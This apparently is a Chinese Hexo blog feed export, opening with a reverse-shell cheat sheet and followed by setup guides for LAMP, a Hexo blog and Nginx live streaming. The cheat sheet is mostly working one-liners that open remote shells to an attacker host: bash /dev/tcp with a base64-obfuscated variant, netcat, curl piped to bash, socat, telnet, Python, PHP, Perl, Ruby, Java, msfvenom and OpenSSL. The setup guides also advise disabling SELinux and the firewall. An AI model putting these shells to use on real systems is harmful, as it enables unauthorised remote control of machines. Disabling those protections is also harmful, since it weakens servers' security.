        <tag>命令执行</tag>
      </tags>
  </entry>
  <entry>
    <title>反弹shell归纳</title>
    <url>/article/%E5%8F%8D%E5%BC%B9shell%E5%BD%92%E7%BA%B3/</url>
    <content><![CDATA[<h1 id="Linux反弹shell归纳"><a href="#Linux反弹shell归纳" class="headerlink" title="Linux反弹shell归纳"></a>Linux反弹shell归纳</h1><p>注意：若是实战环境，反弹shell目标需要为公网ip。（搭服务器）</p>
<h2 id="Bash反弹shell"><a href="#Bash反弹shell" class="headerlink" title="Bash反弹shell"></a>Bash反弹shell</h2><p>bash重定向，优先使用。</p>
<pre class="highlight"><span class="line">bash -c &quot;bash -i &gt;&amp; /dev/tcp/192.168.66.138/1111 0&gt;&amp;1&quot;</span><br><span class="line"># bash -i &gt;&amp; /dev/tcp/攻击机IP/攻击机端口 0&gt;&amp;1</span><br></pre>

<p>以下是针对Bash反弹一句话进行了拆分说明：</p>
<table>
<thead>
<tr>
<th align="left">命令</th>
<th align="left">命令详解</th>
</tr>
</thead>
<tbody><tr>
<td align="left">bash -i</td>
<td align="left">产生一个bash交互环境。</td>
</tr>
<tr>
<td align="left">&gt;&amp;</td>
<td align="left">将联合符号前面的内容与后面相结合，然后一起重定向给后者。</td>
</tr>
<tr>
<td align="left">/dev/tcp/47.xxx.xxx.72/2333</td>
<td align="left">Linux环境中所有的内容都是以文件的形式存在的，其实大家一看见这个内容就能明白，就是让目标主机与攻击机47.xxx.xxx.72的2333端口建立一个tcp连接。</td>
</tr>
<tr>
<td align="left">0&gt;&amp;1</td>
<td align="left">将标准输入与标准输出的内容相结合，然后重定向给前面标准输出的内容。</td>
</tr>
</tbody></table>
<p>Bash反弹一句完整的解读过程就是：</p>
<p>Bash产生了一个交互环境和本地主机主动发起与攻击机2333端口建立的连接（即TCP 2333会话连接）相结合，然后在重定向个TCP 2333会话连接，最后将用户键盘输入与用户标准输出相结合再次重定向给一个标准的输出，即得到一个Bash反弹环境。</p>
<p>1、开启本地监听</p>
<pre class="highlight"><span class="line">nc -lvvp 1111</span><br></pre>

<p>2、目标机反弹连接攻击机</p>
<pre class="highlight"><span class="line">bash -c &quot;bash -i &gt;&amp;  /dev/tcp/192.168.66.138/1111 0&gt;&amp;1&quot;</span><br></pre>

<h5 id="注意：利用工具写入反弹shell时，命令如下："><a href="#注意：利用工具写入反弹shell时，命令如下：" class="headerlink" title="注意：利用工具写入反弹shell时，命令如下："></a>注意：利用工具写入反弹shell时，命令如下：</h5><p>bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjY2LjEzOC8xMTExIDA+JjE=}|{base64,-d}|{bash,-i}</p>
<p>其中，加密部分为bash -i &gt;&amp; /dev/tcp/192.168.66.138/1111 0&gt;&amp;1的base64编码。IP、端口修改时需重新进行base64加密</p>
<h2 id="netcat反弹shell"><a href="#netcat反弹shell" class="headerlink" title="netcat反弹shell"></a>netcat反弹shell</h2><p>1、linux默认自带netcat工具，但是反弹shell功能-e参数通常被阉割，需要手动下载二进制安装包。</p>
<pre class="highlight"><span class="line">wget https://nchc.dl.sourceforge.net/project/netcat/netcat/0.7.1/netcat-0.7.1.tar.gz</span><br><span class="line">tar -xvzf netcat-0.7.1.tar.gz</span><br><span class="line">./configure</span><br><span class="line">make &amp;&amp; make install</span><br><span class="line">make clean</span><br></pre>

<p>2、攻击机开启本地监听</p>
<pre class="highlight"><span class="line">netcat -lvvp 1111</span><br></pre>

<p>3、目标机主动连接攻击机</p>
<pre class="highlight"><span class="line">netcat 192.168.66.138 1111 -e /bin/bash</span><br><span class="line"># netcat &lt;攻击机IP&gt; &lt;攻击机监听的端口&gt; -e /bin/bash</span><br></pre>

<h2 id="Curl-Bash反弹shell"><a href="#Curl-Bash反弹shell" class="headerlink" title="Curl+Bash反弹shell"></a>Curl+Bash反弹shell</h2><p>借助Linux管道命令。</p>
<p>1、在攻击者vps（公网）的web目录里面创建一个index文件（index.php或index.html），内容如下：</p>
<pre class="highlight"><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.66.138/1111 0&gt;&amp;1</span><br></pre>

<p>2、开启本地监听</p>
<pre class="highlight"><span class="line">nc -lvvp 1111</span><br></pre>

<p>3、在目标机器上执行如下代码，即可反弹shell</p>
<pre class="highlight"><span class="line">curl 192.168.66.138|bash</span><br></pre>

<p>curl IP | bash中的IP可以是任何形式（十进制、十六进制、八进制、二进制等）</p>
<h2 id="Socat反弹shell"><a href="#Socat反弹shell" class="headerlink" title="Socat反弹shell"></a>Socat反弹shell</h2><p>1、安装</p>
<pre class="highlight"><span class="line">apt-get install socat</span><br></pre>

<p>2、攻击机开启本地监听</p>
<pre class="highlight"><span class="line">socat TCP-LISTEN:1111 -</span><br><span class="line">或nc -lvvp 1111</span><br></pre>

<p>3、目标机主动连接攻击机</p>
<pre class="highlight"><span class="line">socat tcp-connect:192.168.66.138:1111 exec:&#x27;bash -li&#x27;,pty,stderr,setsid,sigint,sane</span><br></pre>

<h2 id="Telnet反弹shell"><a href="#Telnet反弹shell" class="headerlink" title="Telnet反弹shell"></a>Telnet反弹shell</h2><p>当nc和/dev/tcp不可用时，且目标机和攻击机都开启telnet（23端口）服务时，可用telnet反弹shell。</p>
<p>方法一：</p>
<p>1、攻击机开启本地监听：</p>
<pre class="highlight"><span class="line">nc -lvvp 1111</span><br></pre>

<p>2、目标机主动连接攻击机</p>
<pre class="highlight"><span class="line">mknod a p;telnet 192.168.66.138 1111 0&lt;a | /bin/bash 1&gt;a</span><br></pre>

<p>方法二：</p>
<p>1、攻击机开启两个本地监听：</p>
<pre class="highlight"><span class="line">nc -lvvp 1111</span><br><span class="line">nc -lvvp 2222</span><br></pre>

<p>2、目标机主动连接攻击机：</p>
<p>telnet 192.168.66.138 1111 | /bin/bash | telnet 192.168.66.138 2222</p>
<p>3、攻击机1111端口执行命令，2222端口回显命令</p>
<h2 id="Python脚本反弹shell"><a href="#Python脚本反弹shell" class="headerlink" title="Python脚本反弹shell"></a>Python脚本反弹shell</h2><p>1、攻击机开启本地监听</p>
<pre class="highlight"><span class="line">nc -lvvp 1111</span><br></pre>

<p>2、目标机主动连接攻击机</p>
<pre class="highlight"><span class="line">python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.66.138&quot;,1111));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span><br></pre>

<h2 id="PHP脚本反弹shell"><a href="#PHP脚本反弹shell" class="headerlink" title="PHP脚本反弹shell"></a>PHP脚本反弹shell</h2><p>1、攻击机开启本地监听</p>
<pre class="highlight"><span class="line">nc -lvvp 1111</span><br></pre>

<p>2、目标机主动连接攻击机：</p>
<pre class="highlight"><span class="line">php -r &#x27;$sock=fsockopen(&quot;192.168.66.138&quot;,1111);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span><br></pre>

<h2 id="Perl脚本反弹shell（后缀-pl）"><a href="#Perl脚本反弹shell（后缀-pl）" class="headerlink" title="Perl脚本反弹shell（后缀.pl）"></a>Perl脚本反弹shell（后缀.pl）</h2><p>1、攻击机开启本地监听</p>
<pre class="highlight"><span class="line">nc -lvvp 1111</span><br></pre>

<p>2、目标机主动连接攻击机</p>
<pre class="highlight"><span class="line">perl -e &#x27;use Socket;$i=&quot;192.168.66.138&quot;;$p=1111;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#x27;</span><br></pre>

<h2 id="Ruby脚本反弹shell（后缀-rb）"><a href="#Ruby脚本反弹shell（后缀-rb）" class="headerlink" title="Ruby脚本反弹shell（后缀.rb）"></a>Ruby脚本反弹shell（后缀.rb）</h2><p>1、攻击机开启本地监听</p>
<pre class="highlight"><span class="line">nc -lvvp 1111</span><br></pre>

<p>2、目标机主动连接攻击机</p>
<pre class="highlight"><span class="line">ruby -rsocket -e &#x27;c=TCPSocket.new(&quot;192.168.66.138&quot;,&quot;1111&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;)&#123;|io|c.print io.read&#125;end&#x27;</span><br><span class="line">或</span><br><span class="line">ruby -rsocket -e &#x27;exit if fork;c=TCPSocket.new(&quot;192.168.66.138&quot;,&quot;1111&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;)&#123;|io|c.print io.read&#125;end&#x27;</span><br></pre>

<h2 id="JAVA反弹shell"><a href="#JAVA反弹shell" class="headerlink" title="JAVA反弹shell"></a>JAVA反弹shell</h2><p>1、攻击机开启本地监听</p>
<pre class="highlight"><span class="line">nc -lvvp 1111</span><br></pre>

<p>2、目标机主动连接攻击机</p>
<pre class="highlight"><span class="line">r = Runtime.getRuntime()</span><br><span class="line">p = r.exec([&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/192.168.x.x/1111;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&quot;] as String[])</span><br><span class="line">p.waitFor()</span><br></pre>

<h2 id="Metasploit生成反弹shell"><a href="#Metasploit生成反弹shell" class="headerlink" title="Metasploit生成反弹shell"></a>Metasploit生成反弹shell</h2><p>1、自动生成反弹一句话</p>
<pre class="highlight"><span class="line">msfvenom -p cmd/unix/reverse_python LHOST=192.168.66.138 LPORT=1111 -f raw</span><br></pre>

<p>其中，cmd/unix/reverse_python为python类型反弹命令，其他类型直接更改_后缀即可，如cmd/unix/reverse_perl生成perl反弹shell</p>
<p>2、将生成的反弹shell直接在目标机器上执行即可</p>
<h2 id="OpenSSL反弹加密shell"><a href="#OpenSSL反弹加密shell" class="headerlink" title="OpenSSL反弹加密shell"></a>OpenSSL反弹加密shell</h2><p>1、攻击机生成自签名证书：（填写信息全部回车即可）</p>
<pre class="highlight"><span class="line">openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes</span><br></pre>

<p>2、在攻击机上使用OpenSSL监听一个端口</p>
<pre class="highlight"><span class="line">openssl s_server -quiet -key key.pem -cert cert.pem -port 1111</span><br></pre>

<p>3、在目标机上进行反弹shell</p>
<pre class="highlight"><span class="line">mkfifo /tmp/s; /bin/sh -i &lt; /tmp/s 2&gt;&amp;1 | openssl s_client -quiet -connect 192.168.66.138:1111 &gt; /tmp/s; rm /tmp/s</span><br></pre>

<h2 id="反弹shell后获取模拟终端"><a href="#反弹shell后获取模拟终端" class="headerlink" title="反弹shell后获取模拟终端"></a>反弹shell后获取模拟终端</h2><p>上面所讲的各种方法获取的shell都不是一个标准的虚拟终端环境，它仅仅是一个标准输入。你会发现存在一个问题，就是即使我们获取了目标虚拟终端控制权限，但是往往会发现其交互性非常的差，回显信息与可交互性非常的差和不稳定，具体见情况有以下几个种。</p>
<p>1、获取的虚拟终端没有交互性，我们想给添加的账号设置密码或执行sudo等命令，无法完成。</p>
<p>2、标准的错误输出无法显示，无法正常使用vim等文本编辑器等。</p>
<p>3、获取的目标主机的虚拟终端使用非常不稳定，很容易断开连接。</p>
<p>若是无法完成正常交互，则需要使用python模拟终端设备，命令如下：</p>
<pre class="highlight"><span class="line">python -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br></pre>
]]></content>
      <categories>
        <category>Web渗透</category>
      </categories>
      <tags>
        <tag>反弹shell</tag>
      </tags>
  </entry>
  <entry>
    <title>搭建LAMP环境</title>
    <url>/article/%E6%90%AD%E5%BB%BALAMP%E7%8E%AF%E5%A2%83/</url>
    <content><![CDATA[<h1 id="LAMP："><a href="#LAMP：" class="headerlink" title="LAMP："></a>LAMP：</h1><p>Linux+Apache+Mysql+PHP</p>
<h1 id="1、安装Apache（httpd）"><a href="#1、安装Apache（httpd）" class="headerlink" title="1、安装Apache（httpd）"></a>1、安装Apache（httpd）</h1><pre class="highlight"><span class="line">yum install httpd httpd-devel httpd-manual httpd-tools</span><br></pre>

<h1 id="2、启动apache并设置开机自启"><a href="#2、启动apache并设置开机自启" class="headerlink" title="2、启动apache并设置开机自启"></a>2、启动apache并设置开机自启</h1><pre class="highlight"><span class="line">systemctl start httpd		#开启apache</span><br><span class="line"></span><br><span class="line">systemctl enable httpd		#设置开机自启</span><br><span class="line"></span><br><span class="line">systemctl status httpd		#查看apache状态</span><br></pre>

<h1 id="3、安装Mysql"><a href="#3、安装Mysql" class="headerlink" title="3、安装Mysql"></a>3、安装Mysql</h1><pre class="highlight"><span class="line">yum install mariadb-server</span><br></pre>

<h1 id="4、启动Mysql并设置开机自启"><a href="#4、启动Mysql并设置开机自启" class="headerlink" title="4、启动Mysql并设置开机自启"></a>4、启动Mysql并设置开机自启</h1><pre class="highlight"><span class="line">systemctl start mariadb			#开启mariadb</span><br><span class="line"></span><br><span class="line">systemctl enable mariadb		#设置开机自启</span><br><span class="line"></span><br><span class="line">systemctl status mariadb		#查看mariadb状态</span><br></pre>

<h1 id="5、配置Mysql数据库"><a href="#5、配置Mysql数据库" class="headerlink" title="5、配置Mysql数据库"></a>5、配置Mysql数据库</h1><pre class="highlight"><span class="line">mysql_secure_installation		#初始化mysql数据库（全部回车确认）</span><br></pre>

<p>设置mysql密码（非操作系统密码）</p>
<h1 id="6、安装PHP"><a href="#6、安装PHP" class="headerlink" title="6、安装PHP"></a>6、安装PHP</h1><p>(php-fpm php-mysqlnd不装，其他均可)</p>
<pre class="highlight"><span class="line">yum install php php-common php-cli php-devel php-gd php-ldap php-mbstring php-mysql php-pdo php-pear php-xml php-pgsql php-process php-snmp php-soap</span><br></pre>

<h1 id="7、重启apache使php生效"><a href="#7、重启apache使php生效" class="headerlink" title="7、重启apache使php生效"></a>7、重启apache使php生效</h1><p>（php不是独立软件，依附apache）</p>
<pre class="highlight"><span class="line">systemctl restart httpd</span><br></pre>

<h1 id="8、解压WP网站"><a href="#8、解压WP网站" class="headerlink" title="8、解压WP网站"></a>8、解压WP网站</h1><h1 id="9、复制WP网站文件至Apache网站目录"><a href="#9、复制WP网站文件至Apache网站目录" class="headerlink" title="9、复制WP网站文件至Apache网站目录"></a>9、复制WP网站文件至Apache网站目录</h1><pre class="highlight"><span class="line">cp -r WP/* /var/www/html</span><br></pre>

<h1 id="10、赋予Apache网站apache权限"><a href="#10、赋予Apache网站apache权限" class="headerlink" title="10、赋予Apache网站apache权限"></a>10、赋予Apache网站apache权限</h1><p>（apache服务由apache账户运行，还权限，安全控制）</p>
<pre class="highlight"><span class="line">chown -R apache:apache /var/www/html</span><br></pre>

<h1 id="11、禁用SELinux"><a href="#11、禁用SELinux" class="headerlink" title="11、禁用SELinux"></a>11、禁用SELinux</h1><p>（安全访问控制，影响网站访问）</p>
<pre class="highlight"><span class="line">vi /etc/sysconfig/selinux</span><br><span class="line"></span><br><span class="line">修改SELINUX=disabled</span><br><span class="line">重启操作系统（reboot）</span><br></pre>

<h1 id="12、访问网站ip-80端口，安装wp网站"><a href="#12、访问网站ip-80端口，安装wp网站" class="headerlink" title="12、访问网站ip+80端口，安装wp网站"></a>12、访问网站ip+80端口，安装wp网站</h1><h1 id="13、此时需要设置mysql账户"><a href="#13、此时需要设置mysql账户" class="headerlink" title="13、此时需要设置mysql账户"></a>13、此时需要设置mysql账户</h1><pre class="highlight"><span class="line">mysql -uroot -p			# 启动mysql（需要输入mysql密码）</span><br><span class="line">create database wp_web;	# 创建mysql账户</span><br><span class="line">exit					# 退出mysql</span><br></pre>

<p>（注意！wp-config.php 删除可重装wp网站）</p>
<h1 id="14、其他"><a href="#14、其他" class="headerlink" title="14、其他"></a>14、其他</h1><pre class="highlight"><span class="line">/var/www/html					# Apache默认网站路径</span><br><span class="line">/etc/httpd/conf/httpd.conf		# Apache配置文件路径</span><br></pre>

<p>修改DocumentRoot “/var/www”即可修改网站路径</p>
<p> <img src="/article/%E6%90%AD%E5%BB%BALAMP%E7%8E%AF%E5%A2%83/image-20210809142444807.png" alt="image-20210809142444807" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/%E6%90%AD%E5%BB%BALAMP%E7%8E%AF%E5%A2%83/image-20210809142444807.png" class="lozad post-image"></p>
]]></content>
      <categories>
        <category>环境搭建</category>
      </categories>
      <tags>
        <tag>Apache</tag>
      </tags>
  </entry>
  <entry>
    <title>搭建hexo博客</title>
    <url>/article/%E6%90%AD%E5%BB%BAhexo%E5%8D%9A%E5%AE%A2/</url>
    <content><![CDATA[<h1 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h1><p>Github Pages</p>
<p>GitHub Pages 是由 GitHub 官方提供的一种免费的静态站点托管服务，让我们可以在 GitHub 仓库里托管和发布自己的静态网站页面。</p>
<p>Hexo</p>
<p>Hexo 是一个快速、简洁且高效的静态博客框架，它基于 Node.js 运行，可以将我们撰写的 Markdown 文档解析渲染成静态的 HTML 网页。</p>
<h1 id="二、环境准备"><a href="#二、环境准备" class="headerlink" title="二、环境准备"></a>二、环境准备</h1><p>Nodejs + Git + Github账号</p>
<p>（可用choco install nodejs git一键安装）</p>
<h1 id="三、安装"><a href="#三、安装" class="headerlink" title="三、安装"></a>三、安装</h1><h2 id="1、连接github账户"><a href="#1、连接github账户" class="headerlink" title="1、连接github账户"></a>1、连接github账户</h2><table>
<thead>
<tr>
<th align="left">操作</th>
<th align="left">命令</th>
</tr>
</thead>
<tbody><tr>
<td align="left">设置用户名邮箱</td>
<td align="left">git config –global user.name “zeroChen00” git config –global user.email “<a href="mailto:1652560938@qq.com">1652560938@qq.com</a>“</td>
</tr>
<tr>
<td align="left">创建SSH密匙</td>
<td align="left">ssh-keygen -t rsa -C “<a href="mailto:1652560938@qq.com">1652560938@qq.com</a>“（全部回车）</td>
</tr>
<tr>
<td align="left">添加密匙</td>
<td align="left">1、复制 [C:\Users\用户名.ssh\id_rsa.pub]中密匙 2、Github-Setting-SSH and GPG keys-New SSH key，新建Key，贴入密匙</td>
</tr>
<tr>
<td align="left">验证连接</td>
<td align="left">ssh -T <a href="mailto:git@github.com">git@github.com</a>（yes确认） 显示 “Hi xxx! You’ve successfully……” 即连接成功</td>
</tr>
</tbody></table>
<h2 id="2、创建Github-Pages仓库"><a href="#2、创建Github-Pages仓库" class="headerlink" title="2、创建Github Pages仓库"></a>2、创建Github Pages仓库</h2><p>Github - 加号 - New repository - Repository name 中输入 用户名.github.io - 创建</p>
<p>（注意！仓库用户名需要与github用户名保持一致，否则无法访问）</p>
<h2 id="3、本地安装Hexo博客程序"><a href="#3、本地安装Hexo博客程序" class="headerlink" title="3、本地安装Hexo博客程序"></a>3、本地安装Hexo博客程序</h2><table>
<thead>
<tr>
<th align="left">操作</th>
<th align="left">命令</th>
</tr>
</thead>
<tbody><tr>
<td align="left">使用npm安装Hexo</td>
<td align="left">npm install -g hexo-cli</td>
</tr>
<tr>
<td align="left">验证安装</td>
<td align="left">hexo -v</td>
</tr>
<tr>
<td align="left">初始化</td>
<td align="left">hexo init</td>
</tr>
<tr>
<td align="left">安装组件</td>
<td align="left">npm install</td>
</tr>
<tr>
<td align="left">生成页面</td>
<td align="left">hexo g</td>
</tr>
<tr>
<td align="left">启动预览</td>
<td align="left">hexo s</td>
</tr>
<tr>
<td align="left">访问<a href="http://localhost:4000/">http://localhost:4000</a></td>
<td align="left">出现hexo默认界面则安装成功</td>
</tr>
</tbody></table>
<p>（注：hexo server -p 5000可更改端口，默认4000）</p>
<h2 id="4、部署Hexo到Github-Pages"><a href="#4、部署Hexo到Github-Pages" class="headerlink" title="4、部署Hexo到Github Pages"></a>4、部署Hexo到Github Pages</h2><table>
<thead>
<tr>
<th align="left">操作</th>
<th>命令</th>
</tr>
</thead>
<tbody><tr>
<td align="left">安装hexo-deployer-git</td>
<td>npm install hexo-deployer-git –save</td>
</tr>
<tr>
<td align="left">修改 _config.yml 文件末尾的Deployment 部分</td>
<td>deploy: type: git repository: <a href="mailto:git@github.com">git@github.com</a>:zeroChen00/zeroChen00.github.io.git branch: master</td>
</tr>
<tr>
<td align="left">上传部署</td>
<td>hexo d</td>
</tr>
<tr>
<td align="left">访问Giuhub静态博客</td>
<td><a href="https://zerochen00.github.io/">https://zeroChen00.github.io/</a></td>
</tr>
</tbody></table>
<p>（注意！hexo中所有代码操作，冒号后均要跟一个空格，负责不生效！）</p>
<h1 id="四、主题配置"><a href="#四、主题配置" class="headerlink" title="四、主题配置"></a>四、主题配置</h1><table>
<thead>
<tr>
<th align="left"><strong>操作</strong></th>
<th align="left"><strong>命令</strong></th>
</tr>
</thead>
<tbody><tr>
<td align="left">下载</td>
<td align="left">git clone <a href="https://github.com/theme-kaze/hexo-theme-kaze.git">https://github.com/theme-kaze/hexo-theme-kaze.git</a> themes/kaze</td>
</tr>
<tr>
<td align="left">修改全局配置文件_config.yml</td>
<td align="left">theme: kaze</td>
</tr>
<tr>
<td align="left">新建页面</td>
<td align="left">hexo new page “about”</td>
</tr>
<tr>
<td align="left">搜索</td>
<td align="left">search: enable: true path: search.json field: posts searchContent: true</td>
</tr>
<tr>
<td align="left">其他配置</td>
<td align="left"><a href="https://demo.theme-kaze.top/document/">https://demo.theme-kaze.top/document/</a></td>
</tr>
<tr>
<td align="left">开启评论</td>
<td align="left">1、注册OAuth application<br><br><img src="/article/%E6%90%AD%E5%BB%BAhexo%E5%8D%9A%E5%AE%A2/20190708182819187.png" alt="20190708182819187" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/%E6%90%AD%E5%BB%BAhexo%E5%8D%9A%E5%AE%A2/20190708182819187.png" class="lozad post-image">2、修改主题配置文件<br><img src="/article/%E6%90%AD%E5%BB%BAhexo%E5%8D%9A%E5%AE%A2/20190708184151274.png" alt="20190708184151274" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/%E6%90%AD%E5%BB%BAhexo%E5%8D%9A%E5%AE%A2/20190708184151274.png" class="lozad post-image"></td>
</tr>
</tbody></table>
<p>语句如下</p>
<pre class="highlight"><span class="line">gitalk: </span><br><span class="line">    enable: true #是否开启</span><br><span class="line">    clientID: &#x27;e231ce2...&#x27;</span><br><span class="line">    clientSecret: &#x27;2fb4635367c...&#x27;</span><br><span class="line">    repo: &#x27;zeroChen00.github.io&#x27;</span><br><span class="line">    owner: &#x27;zeroChen00&#x27;</span><br><span class="line">    admin: [&#x27;zeroChen00&#x27;]</span><br><span class="line">    id: location.href</span><br><span class="line">    distractionFreeMode: true</span><br><span class="line">    # en | zh-CN | zh-TW</span><br><span class="line">    # language: navigator.language || navigator.userLanguage</span><br><span class="line">    language: zh-CN</span><br><span class="line">    labels: [&#x27;Gitalk&#x27;]</span><br><span class="line">    perPage: 10</span><br></pre>

<h1 id="五、图片无法显示问题"><a href="#五、图片无法显示问题" class="headerlink" title="五、图片无法显示问题"></a>五、图片无法显示问题</h1><p>根目录配置文件开启post_asset_folder: true（typora的需要配置文件上传路径为相同路径）</p>
<p>使用相对路径引用文件即可</p>
<h1 id="六、使用"><a href="#六、使用" class="headerlink" title="六、使用"></a><strong>六、使用</strong></h1><table>
<thead>
<tr>
<th align="left"><strong>操作</strong></th>
<th align="left"><strong>命令</strong></th>
</tr>
</thead>
<tbody><tr>
<td align="left">1、写博客</td>
<td align="left">hexo new “My New Post” source 文件夹中会出现一个 My New Post.md 文件</td>
</tr>
<tr>
<td align="left">或贴入.md文件（需要增加文件头）</td>
<td align="left">— title: Hello World # 标题 date: 2019/3/26 hh:mm:ss # 时间 categories: # 分类 - Diary tags: # 标签 - PS3 - Games —</td>
</tr>
<tr>
<td align="left">2、更新并发布静态博客</td>
<td align="left">hexo g # 生成页面 hexo d # 部署发布</td>
</tr>
<tr>
<td align="left">3、更改配置</td>
<td align="left">_config.yml文件（修改时:后跟一个空格）</td>
</tr>
<tr>
<td align="left">4、更换主题</td>
<td align="left"><a href="https://hexo.io/themes/">https://hexo.io/themes/</a> git clone <em>file ./themes/file</em> <em>根据主题介绍进行下载并配置</em>config.yml文件（更改主题名称等）</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>附加技能</category>
      </categories>
      <tags>
        <tag>博客</tag>
      </tags>
  </entry>
  <entry>
    <title>搭建Nginx+直播推流平台</title>
    <url>/article/%E6%90%AD%E5%BB%BANginx-%E7%9B%B4%E6%92%AD%E6%8E%A8%E6%B5%81%E5%B9%B3%E5%8F%B0/</url>
    <content><![CDATA[<h1 id="搭建Nginx环境"><a href="#搭建Nginx环境" class="headerlink" title="搭建Nginx环境"></a>搭建Nginx环境</h1><h2 id="1、下载Nginx源码包"><a href="#1、下载Nginx源码包" class="headerlink" title="1、下载Nginx源码包"></a>1、下载Nginx源码包</h2><pre class="highlight"><span class="line">curl http://nginx.org/download/nginx-1.20.1.tar.gz -o nginx-1.20.1.tar.gz</span><br></pre>

<h2 id="2、解压源码包"><a href="#2、解压源码包" class="headerlink" title="2、解压源码包"></a>2、解压源码包</h2><pre class="highlight"><span class="line">tar -zxvf nginx-1.20.1.tar.gz -C ../	# -C指定解压路径</span><br></pre>

<h2 id="3、配置生成文件（一般修改配置文件、日志文件路径）"><a href="#3、配置生成文件（一般修改配置文件、日志文件路径）" class="headerlink" title="3、配置生成文件（一般修改配置文件、日志文件路径）"></a>3、配置生成文件（一般修改配置文件、日志文件路径）</h2><pre class="highlight"><span class="line">./configure --conf-path=/etc/nginx/nginx.conf --error-log-path=/var/log/nginx/error.log --http-log-path=/var/log/nginx/access.log --pid-path=/var/lib/nginx/nginx.pid --with-http_v2_module --with-http_realip_module --with-http_flv_module --with-http_mp4_module --with-http_ssl_module</span><br></pre>

<p>注：需要下载配置环境</p>
<p>如：</p>
<pre class="highlight"><span class="line">yum install pcre-devel zlib-devel openssl-devel</span><br></pre>

<h2 id="4、make编译"><a href="#4、make编译" class="headerlink" title="4、make编译"></a>4、make编译</h2><h2 id="5、make-install安装"><a href="#5、make-install安装" class="headerlink" title="5、make install安装"></a>5、make install安装</h2><h2 id="6、添加nginx到环境变量"><a href="#6、添加nginx到环境变量" class="headerlink" title="6、添加nginx到环境变量"></a>6、添加nginx到环境变量</h2><pre class="highlight"><span class="line">ln -s /usr/local/nginx/sbin/nginx /usr/local/bin/</span><br></pre>

<p>（注！ /usr/local/nginx/sbin/nginx为nginx启动文件的绝对路径）</p>
<p>此时可直接使用nginx命令，如：nginx -s stop停止nginx服务</p>
<h2 id="7、关闭防火墙"><a href="#7、关闭防火墙" class="headerlink" title="7、关闭防火墙"></a>7、关闭防火墙</h2><pre class="highlight"><span class="line">systemctl stop firewalld</span><br><span class="line"></span><br><span class="line">systemctl disable firewalld		#永久禁用</span><br></pre>

<p>至此，访问80端口可看到Nginx测试页</p>
<p>下载任意html静态网站压缩包，解压并复制到Nginx网站路径，即可访问静态网页</p>
<h2 id="8、其他注意事项"><a href="#8、其他注意事项" class="headerlink" title="8、其他注意事项"></a>8、其他注意事项</h2><pre class="highlight"><span class="line">/var/lib/mysql				# mysql数据路径</span><br><span class="line">/usr/local/nginx/html		# Nginx默认网站路径</span><br><span class="line">/etc/nginx/nginx.conf		# Nginx配置文件</span><br></pre>

<p>修改root /var/www/html即可改变默认路径</p>
<p><a href="http://www.zerochen.top/article/%E6%90%AD%E5%BB%BANginx-%E7%9B%B4%E6%92%AD%E6%8E%A8%E6%B5%81%E5%B9%B3%E5%8F%B0/1.png"><img src="http://www.zerochen.top/article/%E6%90%AD%E5%BB%BANginx-%E7%9B%B4%E6%92%AD%E6%8E%A8%E6%B5%81%E5%B9%B3%E5%8F%B0/1.png" alt="1" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="http://www.zerochen.top/article/%E6%90%AD%E5%BB%BANginx-%E7%9B%B4%E6%92%AD%E6%8E%A8%E6%B5%81%E5%B9%B3%E5%8F%B0/1.png" class="lozad post-image"></a></p>
<h1 id="Nginx搭建直播推流平台"><a href="#Nginx搭建直播推流平台" class="headerlink" title="Nginx搭建直播推流平台"></a>Nginx搭建直播推流平台</h1><h2 id="工具："><a href="#工具：" class="headerlink" title="工具："></a>工具：</h2><p>nginx-http-flv-module-master.zip + OBS Studio（pc端）/杏林推流（app端）</p>
<h2 id="1、源码安装，配置"><a href="#1、源码安装，配置" class="headerlink" title="1、源码安装，配置"></a>1、源码安装，配置</h2><p>在nginx源码编译基础上，增加–add-module=/home/chen/software/nginx-http-flv-module-master（导入为绝对路径），即：</p>
<pre class="highlight"><span class="line">./configure --conf-path=/etc/nginx/nginx.conf --error-log-path=/var/log/nginx/error.log --http-log-path=/var/log/nginx/access.log --pid-path=/var/lib/nginx/nginx.pid --with-http_v2_module --with-http_realip_module --with-http_flv_module --with-http_mp4_module --with-http_ssl_module --add-module=/home/chen/software/nginx-http-flv-module-master</span><br></pre>

<h2 id="2、make、make-install"><a href="#2、make、make-install" class="headerlink" title="2、make、make install"></a>2、make、make install</h2><h2 id="3、修改配置文件"><a href="#3、修改配置文件" class="headerlink" title="3、修改配置文件"></a>3、修改配置文件</h2><p>（/etc/nginx/nginx.conf）</p>
<p>在http中新增（与最内层函数同级）</p>
